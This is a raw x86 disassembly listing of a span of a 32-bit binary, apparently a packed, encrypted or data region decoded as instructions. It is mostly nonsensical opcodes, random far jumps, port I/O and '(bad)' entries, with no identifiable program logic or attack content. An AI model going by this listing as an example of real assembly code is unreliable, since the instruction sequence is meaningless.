  402231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402232:	cmp    ch,BYTE PTR [ebp+0x2e7d916b]
  402238:	sub    dh,BYTE PTR [edi-0x5]
  40223b:	scas   eax,DWORD PTR es:[edi]
  40223c:	ss cpuid 
  40223f:	cmp    ebx,edx
  402241:	scas   eax,DWORD PTR es:[edi]
  402242:	imul   ecx,ebp,0x1f09d763
  402248:	aas    
  402249:	xor    BYTE PTR [esi-0xb],dl
  40224c:	sbb    eax,0x2b57e94e
  402251:	out    dx,eax
  402252:	repnz cmp edx,DWORD PTR [ecx+0x13]
  402256:	mov    al,0xa1
  402258:	push   cs
  402259:	gs xchg esp,eax
  40225b:	push   eax
  40225c:	pop    eax
  40225d:	adc    al,0xa2
  40225f:	pop    eax
  402260:	ret    
  402261:	pop    esi
  402262:	mov    ds:0x95dbfe08,al
  402267:	dec    eax
  402268:	inc    ecx
  402269:	push   es
  40226a:	jp     0x402231
  40226c:	das    
  40226d:	or     DWORD PTR [ecx],esi
  40226f:	sub    al,0x3d
  402271:	sti    
  402272:	push   eax
  402273:	add    al,0xe0
  402276:	fisubr DWORD PTR [edx-0x7ce23d1a]
  40227c:	aaa    
  40227d:	mov    al,ds:0xd59a3ffc
  402282:	not    BYTE PTR [ecx]
  402284:	shl    DWORD PTR ds:[esi+0x5824cc85],cl
  40228b:	jecxz  0x40225b
  40228d:	sub    DWORD PTR [eax+0x21],0xc30b52ca
  402294:	sbb    ebx,DWORD PTR [ebx-0x50]
  402297:	or     al,BYTE PTR [esi]
  402299:	xor    esp,DWORD PTR [ebx+0x6885ca91]
  40229f:	hlt    
  4022a0:	push   eax
  4022a2:	repz mov ebp,0x2e40538c
  4022a8:	xchg   edx,eax
  4022a9:	outs   dx,DWORD PTR ds:[esi]
  4022aa:	mov    bh,0x57
  4022ac:	adc    edi,esp
  4022ae:	mov    al,0xc7
  4022b0:	xor    esp,DWORD PTR [ebp-0x70]
  4022b3:	adc    ah,BYTE PTR [edi+0x5af3092]
  4022b9:	pop    ds
  4022ba:	fs fs mov ebx,cs
  4022be:	lahf   
  4022bf:	jmp    0xf8962990
  4022c4:	add    BYTE PTR [ecx+0x3113b484],bh
  4022ca:	xor    eax,0x301d5e47
  4022cf:	push   eax
  4022d0:	jecxz  0x402345
  4022d2:	xchg   esi,eax
  4022d3:	int3   
  4022d4:	cmp    bl,bh
  4022d6:	mov    cl,0x8d
  4022d8:	push   ebx
  4022d9:	arpl   WORD PTR [ecx-0x2043c8d0],dx
  4022df:	or     bh,BYTE PTR [eax+0x70]
  4022e2:	leave  
  4022e3:	xchg   esi,eax
  4022e4:	retf   0x9463
  4022e7:	cli    
  4022e8:	add    DWORD PTR [edx-0x32],esp
  4022eb:	inc    ecx
  4022ec:	idiv   BYTE PTR [edi-0x8f476bb]
  4022f2:	xchg   ecx,eax
  4022f3:	fdiv   QWORD PTR [eax+0x61]
  4022f6:	bound  ebp,QWORD PTR [ebp-0x40]
  4022f9:	push   edx
  4022fa:	mov    cl,0x0
  4022fc:	xor    DWORD PTR [ebx+0x54],esi
  4022ff:	neg    ch
  402301:	push   ds
  402302:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402303:	mov    cl,0xbf
  402305:	inc    ebx
  402306:	jmp    0x4022f2
  402308:	fwait
  402309:	dec    edx
  40230a:	fwait
  40230b:	out    0xac,eax
  40230d:	mov    dl,0xfd
  40230f:	das    
  402310:	and    BYTE PTR [edi],dh
  402312:	std    
  402313:	add    eax,0x55e68d34
  402318:	mov    ds:0xf841e447,eax
  40231d:	xor    bl,BYTE PTR [esi+ebp*8-0x58e65b4c]
  402324:	inc    edx
  402325:	cmp    eax,0x8fb23803
  40232a:	push   0x8aebacdf
  40232f:	mov    edx,0x9abb421e
  402334:	pusha  
  402335:	xchg   ebp,eax
  402336:	inc    ebx
  402337:	mov    gs,esp
  402339:	add    edi,DWORD PTR [edi]
  40233b:	mov    eax,ds:0x2d8af824
  402340:	or     dh,ah
  402342:	sbb    al,BYTE PTR [edi+0x0]
  402345:	or     BYTE PTR [ebx+0x382331ec],0xb6
  40234c:	xchg   dh,al
  40234e:	push   esp
  40234f:	xchg   esp,eax
  402350:	jno    0x402324
  402352:	mov    al,ds:0xd1508c73
  402357:	and    DWORD PTR [edi],esi
  402359:	popa   
  40235a:	mov    esi,0xd08b28dd
  40235f:	fisttp QWORD PTR [ebp+0x48d246ee]
  402365:	cdq    
  402366:	sub    al,0xcf
  402368:	popa   
  402369:	popa   
  40236a:	mov    al,0xd
  40236c:	in     al,dx
  40236d:	and    BYTE PTR [esi-0x74],al
  402370:	outs   dx,DWORD PTR ds:[esi]
  402371:	jb     0x402314
  402373:	sbb    BYTE PTR [edi+0xe4f47a2],0xb
  40237a:	jb     0x4023cc
  40237c:	imul   DWORD PTR [ecx]
  40237e:	mov    ebp,0x371c5048
  402383:	stc    
  402384:	dec    ebx
  402385:	dec    esi
  402386:	fdiv   QWORD PTR [ecx]
  402388:	or     BYTE PTR [ecx-0x758e7eda],cl
  40238e:	(bad)  
  402390:	jmp    0xb43b:0x7f8adf8a
  402397:	adc    ah,BYTE PTR [edx+0x69265a71]
  40239d:	rcr    DWORD PTR [ebp-0x52],0xd7
  4023a1:	mov    eax,0x95b458ec
  4023a6:	cmp    eax,0x3c23c5f5
  4023ab:	pop    ecx
  4023ac:	sbb    eax,0xc54b62c4
  4023b1:	imul   esi,ebp,0x978fb94e
  4023b7:	repnz add eax,0x4bfd3f75
  4023bd:	pop    ss
  4023be:	mov    ch,0xf9
  4023c0:	aas    
  4023c1:	data16 fcmovnb st,st(5)
  4023c4:	gs clc 
  4023c6:	push   esp
  4023c7:	xchg   ebp,eax
  4023c8:	in     al,dx
  4023c9:	jge    0x402429
  4023cb:	xor    BYTE PTR [ebx],0xa1
  4023ce:	mov    al,ds:0xf92425c2
  4023d3:	jmp    0x8445b023
  4023d8:	sbb    edx,DWORD PTR [ecx]
  4023da:	mov    edi,0x52cbb6ee
  4023df:	aaa    
  4023e0:	in     eax,0x14
  4023e2:	arpl   WORD PTR [ebp-0x6d],si
  4023e5:	(bad)  
  4023e6:	add    edi,DWORD PTR [ecx-0x850fac5]
  4023ec:	or     eax,0xcf0b3402
  4023f1:	call   0x1c1c:0xe648a342
  4023f8:	sbb    esp,DWORD PTR [ebx+esi*4+0x7db186b6]
  4023ff:	outs   dx,DWORD PTR ds:[esi]
  402400:	pop    edi
  402401:	cwde   
  402402:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402403:	das    
  402404:	retf   
  402405:	dec    ebx
  402406:	lahf   
  402407:	inc    ebp
  402408:	cld    
  402409:	mov    ds:0x9712882c,eax
  40240e:	cmp    dl,BYTE PTR [ecx+eiz*4-0x15]
  402412:	mov    edi,0x2f9c1d24
  402417:	adc    BYTE PTR [ecx+0x702ff3d0],ch
  40241d:	jg     0x402409
  40241f:	xor    BYTE PTR [edx],bl
  402421:	neg    edx
  402423:	cdq    
  402424:	mov    ds:0x6a5b2c99,eax
  402429:	cmp    BYTE PTR [edi],bh
  40242b:	in     al,dx
  40242c:	or     al,0x1e
  40242e:	call   0x6392:0x425832f4
  402435:	aam    0x9c
  402437:	pop    edi
  402438:	sub    BYTE PTR [edx+ecx*8-0x2],bh
  40243c:	push   ds
  40243d:	cmp    al,0xd5
  40243f:	or     ebp,esi
  402441:	fwait
  402442:	jge    0x402453
  402444:	clc    
  402445:	adc    al,0x1
  402447:	sar    edi,1
  402449:	or     DWORD PTR [esi+0xf39c178],ebp
  40244f:	pop    ebx
  402450:	in     al,dx
  402451:	xchg   esp,eax
  402452:	lahf   
  402453:	test   BYTE PTR [edx-0x2b68e599],bl
  402459:	out    dx,al
  40245a:	cmp    ch,BYTE PTR [eax+0x153819c4]
  402460:	outs   dx,DWORD PTR ds:[esi]
  402461:	and    bl,BYTE PTR [ecx+0x24]
  402464:	xchg   DWORD PTR [esi+0x41],edx
  402467:	hlt    
  402468:	add    DWORD PTR [eax],edx
  40246a:	cmp    eax,0x14230dc5
  40246f:	ret    
  402470:	xchg   ecx,eax
  402471:	sbb    al,0x26
  402473:	sbb    al,0xb
  402475:	and    bl,dl
  402477:	inc    esi
  402478:	fdiv   QWORD PTR [ebx+0x368a4842]
  40247e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40247f:	xchg   edi,eax
  402480:	pop    esp
  402481:	adc    al,BYTE PTR [ebp+0x54]
  402484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402485:	cmp    eax,eax
  402487:	mov    dh,0xb3
  40248a:	dec    esi
  40248b:	and    BYTE PTR [ebp-0x14f68c90],ah
  402491:	adc    DWORD PTR ds:0xf263b74c,esp
  402497:	dec    ecx
  402498:	mov    ebx,0x98b35de
  40249d:	jmp    FWORD PTR [edi]
  40249f:	dec    edx
  4024a0:	push   ss
  4024a1:	gs jg  0x402474
  4024a4:	dec    eax
  4024a5:	inc    esi
  4024a6:	(bad)  [ecx]
  4024a8:	mov    ebx,0xdabad780
  4024ad:	push   edx
  4024ae:	dec    edx
  4024af:	test   DWORD PTR [eax-0x52],edi
  4024b2:	dec    ebx
  4024b3:	repnz pop ds
  4024b5:	xchg   ebx,eax
  4024b6:	ins    DWORD PTR es:[edi],dx
  4024b7:	jmp    0x374e6d92
  4024bc:	stos   BYTE PTR es:[edi],al
  4024bd:	sbb    bh,al
  4024bf:	sub    ah,0x14
  4024c2:	sub    al,0x95
  4024c4:	imul   DWORD PTR [edx+0x1a2f6ac]
  4024ca:	leave  
  4024cb:	xor    esp,DWORD PTR [ebx+edx*2-0x963b603]
  4024d2:	fsubp  st(3),st
  4024d4:	fiadd  DWORD PTR [ebx]
  4024d6:	inc    edi
  4024d7:	mov    ah,0x98
  4024d9:	(bad)  
  4024da:	dec    esp
  4024db:	inc    edi
  4024dc:	mov    ebx,0x4396f508
  4024e1:	call   0x10a8:0x5fc243b7
  4024e8:	sbb    BYTE PTR [ebp-0x21],ah
  4024eb:	out    dx,eax
  4024ec:	(bad)  
  4024ed:	lods   al,BYTE PTR ds:[esi]
  4024ee:	jge    0x4024b6
  4024f0:	jg     0x4024dd
  4024f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4024f3:	ins    DWORD PTR es:[edi],dx
  4024f4:	add    bh,BYTE PTR [ebp-0x5c72261]
  4024fa:	mov    ah,BYTE PTR fs:[eax-0x6491c9f0]
  402501:	pop    es
  402502:	inc    ebp
  402503:	js     0x220aabb2
  402509:	call   FWORD PTR [edx+esi*8+0x2f]
  40250d:	mov    ds:0x863d42d8,al
  402512:	add    eax,0xbe8c6a61
  402517:	imul   DWORD PTR [ecx+ebp*4+0x22]
  40251b:	ret    0x4dd1
  40251e:	pop    ebp
  40251f:	add    eax,0x503ba02d
  402524:	in     eax,0xa3
  402526:	shl    DWORD PTR [esi],0x5f
  402529:	stc    
  40252a:	push   0x60
  40252c:	addr16 add bl,dh
  40252f:	mov    dh,BYTE PTR [ebp-0x4a]
  402532:	sbb    DWORD PTR [ebx+0x63cd59e6],edi
  402538:	fnstcw WORD PTR [edi-0xe]
  40253b:	sub    ebp,edx
  40253d:	jp     0x402570
  40253f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402540:	xchg   ebp,eax
  402541:	repnz dec esi
  402543:	xchg   ebx,eax
  402544:	xchg   edx,eax
  402545:	fsub   QWORD PTR [ecx+0x68]
  402548:	and    bh,BYTE PTR [esi+0x19d71ee4]
  40254e:	aam    0x83
  402550:	cli    
  402551:	jl     0x4025cc
  402553:	ins    DWORD PTR es:[edi],dx
  402554:	ret    0xd729
  402557:	test   BYTE PTR [edi-0x25],cl
  40255a:	mov    eax,ds:0xa5ca2491
  40255f:	test   al,0xeb
  402561:	imul   edi,DWORD PTR [edi],0x99fb2953
  402567:	cld    
  402568:	jmp    0x18b9:0xd026edeb
  40256f:	push   esp
  402570:	bound  esp,QWORD PTR [edx-0x49]
  402573:	pop    edx
  402574:	les    ecx,FWORD PTR [eax-0x6e]
  402577:	pop    esp
  402578:	nop
  402579:	inc    BYTE PTR [esp+ecx*8]
  40257c:	push   edi
  40257d:	jbe    0x4025c7
  40257f:	test   esi,ebp
  402581:	les    edi,FWORD PTR [esi-0x4497e6de]
  402587:	mov    es,WORD PTR [ebx+0xa42c4f1]
  40258d:	(bad)  
  40258e:	jge    0x402542
  402590:	inc    esi
  402591:	je     0x402520
  402593:	mov    cl,BYTE PTR [ebp-0x22]
  402596:	aas    
  402597:	inc    ecx
  402598:	mov    al,ds:0x11f6cf0e
  40259d:	xor    bl,BYTE PTR [esi+0x58]
  4025a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4025a1:	fbstp  TBYTE PTR [edi]
  4025a3:	cmp    al,0x73
  4025a5:	imul   esi,DWORD PTR [eax-0x29608522],0x7f
  4025ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4025ad:	mov    esi,0x8613f9f5
  4025b2:	test   BYTE PTR [ebp+0x7e37a2c9],0xa1
  4025b9:	push   0xffffffd8
  4025bb:	pop    edx
  4025bc:	ins    DWORD PTR es:[edi],dx
  4025bd:	sub    eax,0xd9f8f382
  4025c2:	or     al,BYTE PTR [ebx]
  4025c4:	nop
  4025c5:	mov    WORD PTR [edx-0xf],ss
  4025c8:	mov    dh,0xa0
  4025ca:	mov    ds:0x6d35da2,eax
  4025cf:	rol    BYTE PTR [eax-0x56],cl
  4025d2:	push   ebp
  4025d3:	add    bh,BYTE PTR [ecx+edi*8-0xf5a8b17]
  4025da:	pop    ss
  4025db:	and    al,0xe2
  4025dd:	cdq    
  4025de:	fist   DWORD PTR [ebp+0x55]
  4025e1:	mov    edi,0x66d31219
  4025e6:	jmp    0xdbba:0xa9d52063
  4025ed:	adc    eax,0x11ac6359
  4025f2:	cs out 0x4a,al
  4025f5:	jae    0x4025ea
  4025f7:	ins    BYTE PTR es:[edi],dx
  4025f8:	fcom   QWORD PTR [ebp+0x438bcaff]
  4025fe:	xor    edx,ebx
  402600:	xor    al,0xe3
  402602:	mov    al,ds:0x9f01a17d
  402607:	fsub   QWORD PTR [edi]
  402609:	mov    eax,ds:0x39ce75b1
  40260e:	push   ebx
  40260f:	inc    edi
  402610:	sub    ah,cl
  402612:	sub    al,0xd5
  402614:	shl    BYTE PTR [edi+0x70],1
  402617:	(bad)  
  402618:	mov    ds:0x17d795bf,eax
  40261d:	sub    eax,0x5ce4e660
  402622:	dec    edi
  402623:	xchg   BYTE PTR [edx+ebp*1+0x61],dl
  402627:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402628:	mov    ebx,0x3b1b9251
  40262d:	fimul  DWORD PTR [edi-0x2e]
  402630:	xor    esi,DWORD PTR [ebx+0x7a]
  402633:	aam    0xf8
  402635:	fmul   DWORD PTR [edx+0x0]
  402638:	xchg   ebp,eax
  402639:	jne    0x4026b9
  40263b:	dec    edx
  40263c:	push   esp
  40263d:	jg     0x402652
  40263f:	scas   eax,DWORD PTR es:[edi]
  402640:	inc    esi
  402641:	call   DWORD PTR [esi+0x6b549e36]
  402647:	jns    0x402677
  402649:	int    0x8f
  40264b:	daa    
  40264c:	dec    edx
  40264d:	aas    
  40264e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40264f:	jl     0x4026ca
  402651:	test   DWORD PTR [esi-0x5a6f454a],esi
  402657:	push   esp
  402658:	dec    ecx
  402659:	hlt    
  40265a:	sbb    esi,esi
  40265c:	sbb    BYTE PTR [esi-0x50a50d1c],al
  402662:	jne    0x402663
  402664:	lock daa 
  402666:	(bad)  
  402667:	cmp    eax,0x4a68a710
  40266c:	cdq    
  40266d:	push   eax
  40266e:	sbb    al,0xe6
  402670:	test   eax,0x84e707b6
  402675:	lock lods al,BYTE PTR ds:[esi]
  402677:	ret    0xec67
  40267a:	pusha  
  40267b:	push   ebp
  40267c:	push   0xb4c4985e
  402681:	add    ah,dl
  402683:	xor    cl,BYTE PTR [eax+0x7b]
  402686:	retf   
  402687:	jge    0x40261b
  402689:	inc    si
  40268b:	mov    esp,DWORD PTR [edi+0x77c0ddc1]
  402691:	sti    
  402692:	sub    eax,0xf97684db
  402697:	jo     0x4026b5
  402699:	pusha  
  40269a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40269b:	sahf   
  40269c:	mov    WORD PTR [eax+eax*2-0x4f],fs
  4026a0:	pop    edx
  4026a1:	scas   al,BYTE PTR es:[edi]
  4026a2:	and    BYTE PTR [ebp-0x1e],bh
  4026a5:	(bad)  
  4026a6:	jmp    0x24195022
  4026ab:	into   
  4026ac:	lds    ecx,FWORD PTR [ecx+0x7d]
  4026af:	push   ss
  4026b0:	lea    edx,[esi+0x657db4ea]
  4026b6:	out    0xe6,eax
  4026b8:	in     eax,dx
  4026b9:	test   al,0xe
  4026bb:	imul   ecx,ebp,0xffffff9d
  4026be:	shr    cl,0x7c
  4026c1:	xchg   ecx,eax
  4026c2:	mov    dl,0xe8
  4026c4:	sub    bl,BYTE PTR [eax]
  4026c6:	sub    dl,BYTE PTR [ecx]
  4026c8:	sub    eax,0x8591a5a0
  4026cd:	pop    eax
  4026ce:	dec    eax
  4026cf:	xchg   ch,bl
  4026d1:	ret    
  4026d2:	mov    edi,0x1306d66
  4026d7:	xor    BYTE PTR [ebp+0x4],cl
  4026da:	int    0x79
  4026dc:	mov    ch,0x80
  4026de:	push   0xffffffdf
  4026e0:	xchg   ah,al
  4026e2:	fcomp  QWORD PTR [ebp-0x28]
  4026e5:	xchg   ebp,eax
  4026e6:	cdq    
  4026e7:	adc    eax,0x8096f12
  4026ec:	sub    DWORD PTR [eax-0x7f],edx
  4026ef:	in     eax,dx
  4026f0:	push   ss
  4026f1:	test   al,0xb1
  4026f3:	push   esp
  4026f4:	dec    edi
  4026f5:	push   edi
  4026f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4026f7:	in     eax,dx
  4026f8:	arpl   WORD PTR [ebp+eiz*8+0x7c],di
  4026fc:	push   ebp
  4026fd:	mov    ds:0x40d4f0f,al
  402702:	pop    edx
  402703:	push   ss
  402704:	pop    esp
  402705:	in     eax,0xd9
  402707:	rol    bl,cl
  402709:	inc    ebx
  40270a:	dec    esi
  40270b:	sbb    DWORD PTR [eax],ecx
  40270d:	dec    esi
  40270e:	mov    edi,0x7f335510
  402713:	in     al,dx
  402714:	call   0xd076ad6c
  402719:	retf   
  40271a:	lock es cdq 
  40271d:	pop    ds
  40271e:	in     eax,dx
  40271f:	jl     0x4026c6
  402721:	push   cs
  402722:	push   ds
  402723:	jge    0x4026a8
  402725:	xchg   ebx,eax
  402726:	mov    ah,0x7f
  402728:	nop
  402729:	dec    esp
  40272a:	or     al,0x28
  40272c:	stc    
  40272d:	inc    ebx
  40272e:	xor    BYTE PTR [esi+0x3f],ah
  402731:	es push cs
  402733:	(bad)  
  402734:	and    ecx,DWORD PTR [ecx+0xfe206dc]
  40273a:	sti    
  40273b:	push   edx
  40273c:	inc    esi
  40273d:	push   ebx
  40273e:	sbb    esi,ebp
  402740:	rcl    BYTE PTR [edi],cl
  402742:	adc    bh,ah
  402744:	outs   dx,BYTE PTR ds:[esi]
  402745:	fldcw  WORD PTR [edi-0x15]
  402748:	fistp  DWORD PTR [esi]
  40274a:	pop    ebx
  40274b:	retf   0xa6a0
  40274e:	cli    
  40274f:	or     al,0xe2
  402751:	add    DWORD PTR [ebp-0x62e1ed77],eax
  402757:	inc    ebx
  402758:	push   es
  402759:	adc    dl,dh
  40275b:	imul   ebp,DWORD PTR [edi],0xffffffc9
  40275e:	dec    edx
  40275f:	adc    edx,DWORD PTR [ebx+0x2a6edb60]
  402765:	push   0xffffffb2
  402767:	(bad)  
  402769:	iret   
  40276a:	cmp    al,0x9e
  40276c:	inc    esp
  40276d:	aas    
  40276e:	add    DWORD PTR [esi],edi
  402770:	or     BYTE PTR [ecx+0x6ac72467],0x6d
  402777:	scas   al,BYTE PTR es:[edi]
  402778:	pop    ebp
  402779:	outs   dx,DWORD PTR ds:[esi]
  40277a:	jne    0x40274d
  40277c:	imul   BYTE PTR [esi]
  40277e:	push   0x66b16cc0
  402783:	jns    0x402759
  402785:	aad    0xe6
  402787:	jl     0x402717
  402789:	push   ecx
  40278a:	dec    ecx
  40278b:	xor    eax,0x8f083c0a
  402790:	jae    0x40277e
  402792:	call   0x9ab718d1
  402797:	lock jae 0x402721
  40279a:	add    BYTE PTR [edx+0xf85f3d1],bl
  4027a0:	mov    WORD PTR [edi+0x6e26ab22],cs
  4027a6:	fs push ecx
  4027a8:	xchg   ebx,eax
  4027a9:	aam    0x78
  4027ab:	pop    eax
  4027ac:	jp     0x40277f
  4027ae:	pop    esp
  4027af:	pop    eax
  4027b0:	add    al,0x38
  4027b2:	mov    ah,BYTE PTR [ecx-0x1]
  4027b5:	not    BYTE PTR [ecx+0x23]
  4027b8:	les    esi,FWORD PTR [esi+0x748daf80]
  4027be:	test   eax,0xe79195a5
  4027c3:	icebp  
  4027c4:	jne    0x40278e
  4027c6:	test   ch,dh
  4027c8:	int3   
  4027c9:	cmc    
  4027ca:	push   ss
  4027cb:	xlat   BYTE PTR ds:[ebx]
  4027cc:	int3   
  4027cd:	sub    ecx,DWORD PTR [esi+edx*1+0x29]
  4027d1:	pop    eax
  4027d2:	ret    
  4027d3:	inc    esp
  4027d4:	mov    edi,0xc41f72f6
  4027d9:	mov    bh,0x4e
  4027db:	(bad)  
  4027dc:	lahf   
  4027dd:	arpl   si,bp
  4027df:	pop    ecx
  4027e0:	jae    0x40277a
  4027e2:	xchg   esi,eax
  4027e3:	push   esi
  4027e4:	out    0xd,eax
  4027e6:	xor    DWORD PTR [esi-0x4],esi
  4027e9:	xchg   ebx,eax
  4027ea:	cdq    
  4027eb:	out    0xfe,eax
  4027ed:	mov    edx,0xbb06072a
  4027f2:	push   eax
  4027f3:	clc    
  4027f4:	lods   eax,DWORD PTR ds:[esi]
  4027f5:	and    bl,al
  4027f7:	fist   WORD PTR [ebx]
  4027f9:	cmp    al,0xa5
  4027fb:	mov    ah,0x32
  4027fd:	dec    edi
  4027fe:	inc    eax
  4027ff:	out    0xa3,al
  402801:	ficomp WORD PTR [ebx]
  402803:	mov    edx,0x16b05f35
  402808:	cmp    al,0xf1
  40280a:	sbb    bh,0xc9
  40280d:	arpl   WORD PTR gs:[ecx+0xe],si
  402811:	or     DWORD PTR [ebx-0x75a49aef],edi
  402817:	xchg   esp,eax
  402818:	add    ah,BYTE PTR [ebp+eiz*1-0x6535a736]
  40281f:	(bad)  
  402820:	(bad)  
  402821:	daa    
  402822:	pop    es
  402823:	ja     0x4027b9
  402825:	mov    ebp,0x88bd842f
  40282a:	mov    edx,ds
  40282c:	and    DWORD PTR [ebp-0x4f],0x9e53b9de
  402833:	cld    
  402834:	mov    BYTE PTR [edi],cl
  402836:	call   0xc1f0bd7d
  40283b:	cmp    al,0xb3
  40283d:	cmp    eax,0xd1ba2d19
  402842:	(bad)
  402846:	stos   DWORD PTR es:[edi],eax
  402847:	jnp    0x402817
  402849:	shl    ah,1
  40284b:	in     al,0x50
  40284d:	arpl   WORD PTR [esi],si
  40284f:	adc    al,BYTE PTR [ecx]
  402851:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402852:	rcl    BYTE PTR [esi+0x36],cl
  402855:	inc    esi
  402856:	cmp    edi,DWORD PTR [ebx]
  402858:	(bad)  
  40285a:	push   ecx
  40285b:	rol    BYTE PTR [ebp+0x56f8ca0f],1
  402861:	xor    ebx,ebx
  402863:	xchg   ebp,eax
  402864:	mov    dl,dh
  402866:	xchg   esp,eax
  402867:	shr    DWORD PTR [edx-0x555afd14],cl
  40286d:	ficomp DWORD PTR [esi-0xe]
  402870:	out    dx,al
  402871:	arpl   WORD PTR [edx+0x60],sp
  402874:	push   ebx
  402875:	aad    0x76
  402877:	mov    edx,0x7f319b0
  40287c:	mov    edi,0x159f7593
  402881:	pop    ecx
  402882:	loope  0x402854
  402884:	addr16 jge 0x40283b
  402887:	out    0x84,eax
  402889:	sti    
  40288a:	shl    dl,0x22
  40288d:	aad    0xec
  40288f:	sub    eax,0x3eb66ac1
  402894:	lea    edx,[di+0x553b]
  402899:	cmp    esi,DWORD PTR ds:0xfef1b091
  40289f:	jmp    0xaa08ffdb
  4028a4:	je     0x4028c0
  4028a6:	les    edx,FWORD PTR [eax+eax*4+0x72819c93]
  4028ad:	repnz pop edx
  4028af:	mov    dl,0xae
  4028b1:	cld    
  4028b2:	jno    0x402870
  4028b4:	xchg   ah,cl
  4028b6:	into   
  4028b7:	and    DWORD PTR [edx+0x5e],0xffffffb2
  4028bb:	rol    BYTE PTR [edx-0x5],1
  4028be:	xlat   BYTE PTR ds:[ebx]
  4028bf:	pop    ax
  4028c1:	jmp    0x402853
  4028c3:	jl     0x4028d2
  4028c5:	retf   0xef5d
  4028c8:	pop    ds
  4028c9:	shl    DWORD PTR [ebp-0x50],cl
  4028cc:	pop    ss
  4028cd:	loope  0x402887
  4028cf:	add    al,0x3
  4028d1:	(bad)  
  4028d2:	out    dx,al
  4028d3:	enter  0x2a61,0x0
  4028d7:	shl    BYTE PTR [ecx+0x2b],cl
  4028da:	(bad)  
  4028db:	hlt    
  4028dc:	jle    0x40293a
  4028de:	call   DWORD PTR [eax-0x6f]
  4028e1:	xchg   esi,eax
  4028e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028e3:	and    bl,BYTE PTR [ecx+0x281611ef]
  4028e9:	sbb    dh,bl
  4028eb:	mov    BYTE PTR [ebp+0x15c3c459],dl
  4028f1:	mov    al,0xd
  4028f3:	jns    0x4028ea
  4028f5:	pop    ds
  4028f6:	jge    0x40288b
  4028f8:	nop
  4028f9:	scas   al,BYTE PTR es:[edi]
  4028fa:	lock (bad) 
  4028fc:	retf   
  4028fd:	in     al,0x64
  4028ff:	call   0x6605:0xcbc1fbae
  402906:	pop    ebp
  402907:	lods   eax,DWORD PTR ds:[esi]
  402908:	xor    eax,0xd602202e
  40290d:	add    eax,0x8e1ff04a
  402912:	out    0x16,eax
  402914:	jl     0x4028d6
  402916:	into   
  402917:	dec    esp
  402918:	rcr    eax,cl
  40291a:	gs sbb esi,ecx
  40291d:	pop    ebx
  40291e:	repz cld 
  402920:	in     eax,dx
  402921:	ds int3 
  402923:	call   0x1971:0xedb3fce4
  40292a:	push   eax
  40292b:	stos   DWORD PTR es:[edi],eax
  40292c:	call   0xf950c5a3
  402931:	inc    ebx
  402932:	sub    edi,DWORD PTR [edx]
  402934:	adc    dl,BYTE PTR [ebx]
  402936:	adc    edx,ebx
  402938:	imul   edi,DWORD PTR [edi-0x2b],0x951b4df4
  40293f:	(bad)  
  402940:	xchg   esi,eax
  402941:	inc    ecx
  402942:	repnz daa 
  402944:	(bad)  
  402945:	out    0xd3,eax
  402947:	mov    bh,0x18
  402949:	outs   dx,BYTE PTR ds:[esi]
  40294a:	xor    al,0xf9
  40294c:	imul   edx,edx,0x227cceaa
  402952:	data16 mov WORD PTR [esi+0x6b0196aa],?
  402959:	jne    0x4028fd
  40295b:	add    DWORD PTR [ecx+esi*1],ebx
  40295e:	push   esi
  40295f:	in     eax,dx
  402960:	mov    BYTE PTR [esi],dl
  402962:	fidiv  WORD PTR [edi]
  402964:	lods   eax,DWORD PTR ds:[esi]
  402965:	cmp    eax,0x5ae64137
  40296a:	in     al,0xd
  40296c:	dec    esi
  40296d:	(bad)  [ecx+0x7de90382]
  402974:	mov    ch,0xd4
  402976:	push   edi
  402977:	aam    0x70
  402979:	lahf   
  40297a:	jne    0x4029b8
  40297c:	and    al,0x51
  40297e:	or     edi,DWORD PTR [ebx+edi*2-0x555b8d10]
  402985:	dec    ebx
  402986:	pop    ss
  402987:	push   ds
  402988:	add    eax,0x11456be9
  40298d:	aas    
  40298e:	fdivr  DWORD PTR [esi]
  402990:	lods   al,BYTE PTR ds:[esi]
  402991:	les    ebp,FWORD PTR [eax]
  402993:	pop    esi
  402994:	cdq    
  402995:	push   0xb98741f6
  40299a:	cmc    
  40299b:	cmp    al,0xef
  40299d:	fwait
  40299e:	mov    eax,ds:0x4d19050c
  4029a3:	sub    ecx,ecx
  4029a5:	jno    0x402982
  4029a7:	in     eax,dx
  4029a8:	or     DWORD PTR [esi-0x7483ba0e],0x3ccb15ca
  4029b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4029b3:	or     eax,0x71055db1
  4029b8:	popa   
  4029b9:	xchg   BYTE PTR [ebp-0x5e],al
  4029bc:	adc    ecx,ebx
  4029be:	bound  esi,QWORD PTR [edx]
  4029c0:	stos   BYTE PTR es:[edi],al
  4029c1:	out    dx,al
  4029c2:	xchg   esi,eax
  4029c3:	push   ebx
  4029c4:	or     DWORD PTR [esi-0xa],eax
  4029c7:	adc    ch,ah
  4029c9:	pop    ss
  4029ca:	in     al,dx
  4029cb:	inc    edi
  4029cc:	std    
  4029cd:	pop    eax
  4029ce:	shl    DWORD PTR [esi],1
  4029d0:	add    eax,0x48c2ae43
  4029d5:	or     DWORD PTR [ebx+edi*1],edx
  4029d8:	sbb    eax,0x61a07ece
  4029dd:	xor    eax,0xce3483e6
  4029e2:	mov    ds:0xb72f19ee,eax
  4029e7:	inc    esi
  4029e8:	gs cdq 
  4029ea:	fucom  st(5)
  4029ec:	inc    ebx
  4029ed:	inc    ebp
  4029ee:	adc    eax,0xca415aab
  4029f3:	aad    0x90
  4029f5:	imul   edi,DWORD PTR [edi-0x36f47ee8],0x4991df61
  4029ff:	inc    ecx
  402a00:	mov    dl,BYTE PTR [esi]
  402a02:	(bad)  
  402a03:	outs   dx,DWORD PTR ds:[esi]
